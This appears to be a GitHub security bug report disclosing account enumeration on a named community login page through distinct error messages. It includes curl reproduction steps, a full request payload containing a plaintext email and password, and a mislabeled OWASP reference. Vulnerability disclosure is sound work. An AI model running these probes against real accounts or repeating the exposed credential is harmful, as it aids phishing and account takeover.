---
name: "🐛 Bug Report – Account Enumeration via Login Error Message"
about: "Login form leaks account existence via distinct error messages."
labels: ["bug", "security", "needs-triage"]
assignees: [hasanwlip]
---

# 🐛 Account Enumeration via Distinct Login Error Messages

The login form leaks whether an email is registered or not based on two different error messages.  
An attacker can use this to enumerate valid accounts.

---

## 📝 Environment

- **URL:** [https://community.silabs.com/SL_CommunitiesLogin](https://community.silabs.com/SL_CommunitiesLogin)
- **Content-Type:** `application/x-www-form-urlencoded; charset=UTF-8`
- **Platform:** Salesforce Visualforce (ViewState + session cookie)

---

## 🔍 Reproduction Steps

### 1. GET the login page

```bash
curl -s -c cookies.txt "https://community.silabs.com/idp/login?app=0sp16000000PBKn" -o login.html
```

- Capture the session cookie and the hidden fields `com.salesforce.visualforce.ViewState` and `com.salesforce.visualforce.ViewStateMAC`.

---

### 2. POST to the login endpoint

```bash
curl -s -b cookies.txt -c cookies.txt \
  --location "https://community.silabs.com/SL_CommunitiesLogin" \
  --header "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  --data-urlencode "AJAXREQUEST=_viewRoot" \
  --data-urlencode "j_id0:form=j_id0:form" \
  --data-urlencode "j_id0:form:username=<email@example.com>" \
  --data-urlencode "j_id0:form:passwordBox=<password>" \
  --data-urlencode "com.salesforce.visualforce.ViewState=<VIEWSTATE_FROM_PAGE>" \
  --data-urlencode "com.salesforce.visualforce.ViewStateMAC=<MAC_FROM_PAGE>" \
  --data-urlencode "j_id0:form:loginButton=j_id0:form:loginButton"
```

---

### 3. Observe the responses

- **Unregistered email** response:

```html
<label class="error">Your email address was not found.<br />Please try another email address, or <a href="https://community.silabs.com/SL_CommunitiesSelfReg">register</a></label>
```

- **Registered email** response:

```html
<label class="error">Email or password invalid</label>
```

> **Important Note:**  
> The `ViewState` and session cookie **expire immediately after each GET request**.  
> ➔ Always perform a fresh GET before each POST.

---

### 📸 Screenshots

- **Successful login attempt response (HTTP 200 + login form error shown):**

![Login Response Screenshot](https://github.com/user-attachments/assets/6a916170-e83f-4d72-8956-58e73af6d608)

- **Unregistered email login attempt (Email does not exist):**

![unregistered email version](https://github.com/user-attachments/assets/3332d63c-bc8d-4d75-b81b-1680037b6ed4)



---

## ✅ Working Test Payload

Use the exact payload below to verify a successful (HTTP 200) login structure.  
Replace the `ViewState` and `ViewStateMAC` with fresh ones.  
**Important:** Preserve full percent-encoding (%2F, %2B, etc.).

<details>
<summary>Click to expand the full working payload</summary>

```text
AJAXREQUEST=_viewRoot&j_id0%3Aform=j_id0%3Aform&j_id0%3Aform%3Ausername=hasanwlip%40protonmail.com&j_id0%3Aform%3ApasswordBox=147258369hHzZs%40&com.salesforce.visualforce.ViewState=i%3AAAAAWXsidCI6IjAwREEwMDAwMDAwTDJrSSIsInYiOiIwMkcxTTAwMDAwMEQ5YVEiLCJhIjoidmZlbmNyeXB0aW9ua2V5IiwidSI6IjAwNTFNMDAwMDBBaWJhUCJ9gAKLIGvX0fDfSDsXoKL2Ayl9kZ42SBoV3TfUMwAAAZZpsBhJvwvi0TBYeFuILrJuqB88dJzXQybsZPGOw7563WO7u%2F1Vioif5Boy0D4AaM0WvnCUohyx3HAuupE0a9qFvBeJDoYXrVCbDRH02L0ZSPu60tu7gbCPkKHfpn%2FtRG1BOcrF0gKPCvVV3WiNttKarOEOsuTtxUsqx%2BK4I5PYVZ4Jdgev3ChMoM%2FGNJkW5LzZOtH4FYe6w98okHAXIcRLTtTxS8r709zq6WUADLDMRsKL2Z%2BwDTMZp6yL1mczzNuHD3WW0oL9SvIayxRMSixdVBYoXWM%2BHCzLYce6Odm0OVVy0BfyJrzMFjvRUkUwPUpsVH%2Bq6HAOOvaTmZiNblJj1U5XeqNcZ0%2F%2FIuj1KqMZuDR3GofeHNhmVsi9v4I26qD4fuY2dE5ajl5ZYYZ8oYpeep0SAsXtB40fJdMNmv%2BLTSd3AQDsvKMDt6mNoqWprofPNVcVDi%2FadmxljO8ygJ6OuD1kkOyPkGSoD1tLXBZpJ5dkE%2FQmt5tUq8YJk51O%2BCdvx%2F3%2FzpyTHghKMciRFDOqoBx7ZgVN8%2Fk5sFqszfklsEnvRw6HVex76SEMRWt2Q53YHIMBpeQ1LRJzf6psGs41DX2NDi9OQQSSTrzagRwwQwEeT9k7xITiKyITkL%2Fx7QLi%2F2pj3PfImdAKN116ZdDyfNG3YbgqY%2BYDRdo%2FW1MVC8PDU8E53L2s37%2Bu4o0SwjBmPD1NuBNFRpOFq%2Fp0zIc9VzUQfOrqhlA0aGYrx3R0luMyOzdBUS0Y53GymZfUWwVWGwmnluneL76lxFgPdxov0Kvn6TqCJoGVKnhHAA%2FbMP8hoIe48jyMJaM2mZzmVnMaJIxdfqN4I5%2FKR6UFJHyugdq3VwRG%2B3lW4OamY3lqoIHo6TCXMqfimscjvmlYsWlC%2FkzaompWyfuA2yyOpGWnllGWTHLRUaEdoNK1Xcu3maURl57nwJwfOzDwr%2BRqxKFGGesF%2F3sb96HSXy9cmc4OzqeZL%2BY%2FWP%2BfithVjeedo5zTQMUNXuZYnCtp9N0A45jmr5M3CkhU270xB0uSNxV5yS%2B8HPCxzpnqq192Elznzjf4fs0MIwFuQUHg0q8P21fi9NQQisHq2cOgm3KUQjXabw3Ngn2MBhAY5IXW3Aet2SSzgP7cGBznl%2FSTzbFN%2B3%2FgnmA5RFg00ws%2FAkrlj7vLwQ1w11Ec8a6uatbiwHqzerSgz3zUh1BVh7ePzi6%2FW0q%2BGqU65wU73U6nAIPRM%2BBVijhL5vMampaLOQmwT%2FfOXCDoU4Rutt9gULNtOwm1%2FCEBDaGJZFk2tqnfDcSOEGWPOuKf%2BartzUbkry0KWsxalmnVSneR0bVIovctYoaAKPl7iqzNcF9MNbBwI%2BslOAd1HJsXzYcCwWBi5dUCQ5vvdXbAmbP25Pm3eF50gWSaexeAceHo%2F6varFZHG9rCKftF0103PK7mBCkXcuIwYbk4LEYlQleT0Trs%2BjC15H0d%2FZws5CI9Qjx7bob2epa2laxoHuf6%2FUuH344cMqU3TtvpoAVS9uAr3vOwIsoD6R5Ss1hN%2FkkNi%2BIcw1mE80N%2FbhnIhF5j2JIgORofRShqeELs0%2Bk%2BmFMliNejJCr8CVTw2aku3n0zXR4V5h3ZfsSzZ6A93urF6BF3K2PwMet4PUPKtFlu4yn7FqTX2jQjLX7ekLGcWM72Hq8vPA1IPscU7pWeRqupA%2Fwx8FKimjGP3jsLECYMOycKweG7sjUR%2BsOErtwxm4nGEAfMnFvFqP4pKX1Aim0R5M1%2FMSb0%2BH9JeMmURKRnSFMn40wHtfr90O7%2Fyar2cwZQs78UZ3AoKvb72EkS3ZgjVJxmvzjW4i5kH3XKCFm347JYN01M0oHUnTIlE50bIC03ktX5eOhz5XyUvvplGzJpnhElBNDgWCpJWkh3oBsxKW18Wtojag00W1IcEAICxM45e1nf95RyToYo8XSP6fB8VAZvms5s%2BR8%2Bpx%2BA3%2FkT7FhS8q0kT0%2FRmpv5oCJA0Y44s3ANs8Za%2BKhtfCiilvv7uzzQc9SRS3%2BdI1jSr7uEyP%2Be5JOdysC%2Ft6sZuTvHngHFfPyb7gCXcDfRhmogZrBYJao6ogkHMRN4tySGIAVpNEZI3%2FJEypyuM9fbmkV23aZ4%2BDk%2FWwnR66hEIds0T42ib2Ikw%2FFRq2325J8mUJKyMv%2FggFbIIsP0%2FwD1qZZpaEC9j9u3aNU1rMW46HMWITAzsr%2BKMNQfAEjUuGp93PiagFnIyLwIwZf77io%2FDVFTHPm0a1S4uoyLPztt2FaL6CMDb3VNN2AA5tvqGZECgPhlsee3KMf0ggBNkPcQmRVTEFPtJAld7Ob17AnXuqjaPEajTSEfZIbCpPjKTxWUFvvcoDkT56eMqOXzfu9WO5y%2BrlbpRyrPhgdpQ116CLkMeKVpbmzTbaN7UsCwQ8llU1ZbqH4%2BV8z35KV%2FooHD%2BXrVwcvQkEl%2BToqRcFcPVYnsSxJHxhva8pLfbiRhprdXcruvCK4ptWCairZUDvV8bvBq%2BEHaPyzgcG%2FkdxyLYAmcrWIXXfhZGlnm6jwVV30paaA67OBGMvQLsemlOWyFnGHS1el8E9djjyv7ykCzjVMmrLuCGbVRWyQk7bOdqI%2BoEwOu9oX3jBygJT1VqCfS92v7nNRL2rHb5ARTGJXthIC307bhyrEFDEPFeYaqOm2MPnc8saJA903Lw%2B1C26k9axSL0LoByu2c2rce%2BnDD83v9WMbxChJU36%2FfYLXAqNpAfyKfAwsodT4nG18CN6n8FlRW4JiNECEvp%2FQ6RQnUvNBduI9%2BYwUh0rM1FoDpQRh2SrwNCnT0XhUcl3YP%2BH181KmdClUFGkvhipBfmXMcVJWhmMbu9dXgnR%2F24wIzSB7AjBlAh6UUlRrH%2BieKeUZ%2FYbNVQoU7eMM4NQtWvz%2BVwDGkd64%2F4J2Fyhi7hX5vGmEfm%2FWdT4FqyBEaAzee5uwFQhDa1xUr515IOJfSALcZJTJMsL9ZgLODp0YTfKc2tfeADHzw%2BtjaycGsQg4LSB1e7eWCnxiu69rV6bBpOGusngc9Kp2pXYWkPRrXbtCxhHLC1bWIMHkbimVqf%2FzvUwv27zYcW0U%2F3XXuwLTEMXsiS2rtN3xgddtrd0L%2FHAG34J1OE4DqRGbX7bbn210Mn49DLLapPS9Dt4e3djDmQr2mGM04HNBxY%2Fl%2BiBj1BSHeJa7WS%2F%2BpAlXE%2BDZc9S6FztK2%2BNV5%2FFXibl679NrhILQptkC1XMYKEvt7sbVbdxddvJADfGSaXyv13PGUdQ5o4VlXbBluHg4ISqjlgO%2F1zDQlEgD9rgiMuh2SErw0jROoDyn2RHdCWbUUM8gLQOCyPHBtRA3IJSR%2BeItA1XJWLprSdiWiMXuZE97X%2F69WuZ1EipGFa%2Bj0fl1f5VC3FIG1myygMenBZ%2BXKFFp2M%2BYW9TxCwQ4IJOfjZ92KHQFwrB4c2PJKseSPPErvTWqQqJey66YYqx1yMG10I4GaSO8Pc7ZgIPJURqNoi8vWtDLf6Z3wet95vU%2FwxvA6Dtor6NK13Vv2iZTaLwrk0G%2Fg8RH7zzGkjgpRMKTqdAN7maOyPf4do7VpFZJug80S3bB8GLai8vKwTn0Si2A3l7IleeWMolFAH2SREJko219jVA2k02m4ZY4gWFxEJcgS5gcW5O727Y61RyZdLRYLEyatVWrjvFx4RZLoYaUZWl4K3C2Mm7YW2pVgfT15S3H72WTGd8WsbGNsgrvoyRoGc3F%2FwDHsZrFg3LHC6Vyo5qlvMPYmTvrV%2Fn69%2FXMLeVAEsz5KJHQ7GmoBNV%2FwWEngkJaG%2FhiAKyEd%2BrGwWdKia06xR5OtaEojYsQLwJCDmOGHnrPhL2E0I0WxGwdSGe2V3hXWK1xIiEwoWFdqjBbNAi%2B6zjVofSQ%2F1AnpfRzmwvCsoRkrhiJTU%2BOv3jzUeG%2F6IoKqlrNmyKl70fpN%2BHNzgQxE94K9gscXKOAfDat3jWvQrLXrzw8wYh5%2Bb9V7E0jurybnzG79mcRQR6r1UGjhJ1vEP0SZqwvz1Mw73J%2B7AQnfwYEBGH5oAUjDdvxk8gvD%2FBgqlAb01yLra3T0erhqeDnP%2BLN9kscFgIO4noeyAL7g3lSQ78udl3i1TL%2F84DNV%2BGdLPDkRhRMemiMHxHQUbVSA4g50%2FwT49nz7bffRNkphiR0IosuNSoumHfaBCFgOH92nmocd8U8AJwSXosrXBnyA%2BTHmpvKx7z2U5M%2FxenzR1l6RRUFZVQhi5ndX%2BqiTrqpSYy0bvYmOn8tKzSgyDJJkrUJdr5LGLwjwz5ViOaouHny3AIoVlN%2FRj3kzJAhmpYdO5LygIk9jd0tFX%2BWh3sSdNgGFBG4uPRqNNmpaxUh0OOuLLLi%2FQkUMKjgY1FEDoostz%2F%2FMDObx528d9iuV%2BnwaZm8wA3Log1ZNfoodA%2FytkSpCNqK8C2l2vxYveVwJy2ltrJTugjeMPr3wKb7gQHfz0O16sm9clfpzC3rBkbHulYUra08LGFzFvU5scwzWCv8nvitGWso%2BQeIDp2xk6oZQdbh2PczZvqf6tTfCN2lZ22MwijwBESZdrGz3Iu%2FgaBLPVDaktfYGtK8qfLEjuSxQKWOuyUy6q0LrfJMlBj%2Fa0O%2Bf0uvkywQyEi3SgaloOrHUE1FBCEGKb0H4sZUs3mYD40xwHM%2By0JIIWrcaR7jolVz6IxpT7V3vxgwNl%2F4x82SE21JZjZQ%2FwBtlxUMiDf1AMGd%2BsDvVvLuqsylDtFpQVS0KcDelL9E2bOTyQw5N3XvIHgYp5Kb7IQF8fecKJQbp411uAwuVEr1ec%2BZSjrVjDxsH5y7tdTBIlVxrc7RNkaYs36gyJtvEUJmykUr5oo4mBFPRE2Yp7AT0cly8UA7soatSPJaLiRj9z7jFnNdT8brs%2FmvwCdjn2Ne%2B8xcUZMqxrBDG5np0UeHIbZ4zbLCFUyLLmbl534Fsy1HVs24g3rw9UhSY%2BACxa8AsvJlvZ4DynLrjA%2FEKib%2F4V8zCLrHjA7YDW%2BKaixTMZbNvhwBUqbPvlC%2BAHmsySW9AIulEqZCv4CkI9Mx4yJFTHy7kQSEfKIFWwKO3j5y3sGhJZ5fqUbgRkf%2FsvQsMcd1lwqTqZxFvQ%2FBp64S3UqOSNqn1I9jvLZxUWwSMaev1D5pAzMicVPOXiLnsWMosiptt6p%2FUQKKe5WrdyRdqO36DQp8ENhJwhnEvVzf8b8NfweqCEWhFnLy3a3ea3MU7oe9AYMgb18A4dZWryC92F8pdma8DzezJwqMraVi%2Fyl6JK%2FcQX3HoOY38veelP86eEXBqErPDC8qxRkqqEGgb5DxLS%2Bga88HKr87P%2F0LPCV%2Bk4D6HG8uDgEKnY%2B2cktt8U1Zw0206YJgqVpnQWz6ZDr0it7TvPzFflhfsD4n%2FE7RGITuH82T0UkUVBaRIhOLECdGQUWG8rYSO5FY53K3ydRRp1BGSLfkxHPcvvp1mtF12cNO8m3MixL9JLPeOjMSEaLbErzqmlNC073sviORTRgmbZFypOdl6a59XjQ6yUY%2BxGQxVIBAsD%2Fxn8lVAYNm0IKmRQr5rconJvsuZDPaQvjsFfsmFDoLP9Mh4rUUwPgR1kZ1S0P66eCe7ttsNE1HJcUDwWMHr81In8GpX4F5swIlYMz%2BuxJjk63Vh0auw89PD%2B4tA6w30llApjO6b%2BMRf19IjncA4as7XRnS8upjEilSTCdY%2FVBh88qbfO9fJR%2FVWg5r5%2BqVVV3dfiZw%2FF7ZyJz7Joc67zpHSLjY1ux7RTeDJYpvqkCBpYdqO7LZvpwMF6DXqIvwoPk9jc3p1XWBa0Vm5SZOOkeucn4WO9YBNJNAfuGiDLn4pCryW3zhzAeWe%2BWkJW5Glsb%2Bqg8o%2FmlO5qqOwp09GKz2qXnI%2FIb2oaZS3vLNBoqViumW15FRVZckNYQ1KcwtvJ2mdtlJC4J830yBWqe0EJ7nJvm5pAhzB91l%2B631JgDqlYOWnRMJHmKBwfunxCuYJNZjtksG3xvHvnjQgFy5KRVqCKWhd4CiPTDErbmcHViCvPFID6HF0nkc4xMZXYyeVZQsyes9RXTq3kLY2a8Mvg1ENaBiZc%2FRXg1X%2BDKTVxI6UAhZGt%2FTbDZ2o17K9Lb9SRGDWOCt14WgxmmhfAAyk6LvKuVJa8FYMj6KP5xHVrtByHSiLGzqpSpKjQvlHdDqWUHmHbA52YNsDaCf30W2WQhzIsRE%2Fws9Y%2BPKv6UOR4w9NjN%2FunVHAW%2B0RTN9CFrrFo0fqDxwoJdshJVxLlHHd5QMzwOzdgTvtG4lsCo5AUg%2FKI4K3jcH1869I4QPBaTX972LpKwkDXwE2mS6Zawk1kFCo7LcDqGMR9ax4Q4mBx2wAPPk6kxh0bNCxk261hB1w029cfSLGPD9WMViolkXW5RXM2Gpkstt4jTpelFu6tfopvgeJtXM%2BLjalJYP8BlNGW2pa461KJISb%2FUIOJLY4F7v4iVtzj32rBDRDEUu8GVG1VvvshzrjJm4%2Bh0%2FuQ22WBpLiZ8MjRiFKzM429tbkmFDa2WnKkcM7hpttoI3Q%2B0Mbu8LrA9hLqG%2F6ihTXwi2nRQl95R3I3Emfobs995TV36osv9cFCUkoKItj9jOxDBFqYvwqd7Pk31IjqdUv&com.salesforce.visualforce.ViewStateVersion=202504230234207177&com.salesforce.visualforce.ViewStateMAC=AGV5SnViMjVqWlNJNkltcG5TMFJ2VEdGTlVIcDVWbGN3ZGxkNE5UaFRTM1JUZGt0cE1tSlJXRlpsWmxoV1RUZEJkM010VTBGY2RUQXdNMlFpTENKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUlzSW10cFpDSTZJbnRjSW5SY0lqcGNJakF3UkVFd01EQXdNREF3VERKclNWd2lMRndpZGx3aU9sd2lNREpITVUwd01EQXdNREJFT1dGUlhDSXNYQ0poWENJNlhDSjJabk5wWjI1cGJtZHJaWGxjSWl4Y0luVmNJanBjSWpBd05URk5NREF3TURCQmFXSmhVRndpZlNJc0ltTnlhWFFpT2xzaWFXRjBJbDBzSW1saGRDSTZNVGMwTlRVeU9UZzNNRFF4TUN3aVpYaHdJam93ZlE9PS4uODVGMTF0NEswZDNlaU5QcWRzREptRDRCRzQ0akxQM0JrNlg4Mk9LbXhpTT0%3D&j_id0%3Aform%3AloginButton=j_id0%3Aform%3AloginButton&
```

</details>

---

## ⚠️ Encoding Note

In the payload above, all special characters (/, +, etc.) in the ViewState must be fully percent-encoded (%2F, %2B, ...).  
**Any raw + or / will break the request.**

---

## ❌ Actual Behavior

- Unregistered email → “Your email address was not found.”
- Registered email → “Email or password invalid.”

---

## ✅ Expected Behavior

Return a **single generic error message** for both cases to prevent account enumeration.

Example:
> **Invalid email or password.**

---

## 🚨 Impact

Attackers can enumerate valid emails and launch targeted phishing or brute-force attacks.

---

## 💡 Recommendation

Normalize the login error response to:

> **Invalid email or password.**

---

## 🗓️ Timeline

- **2025-04-25:** Issue reported.

---

## 📂 References

- OWASP A05:2021 – Broken Authentication
- Salesforce Visualforce Security Best Practices

---
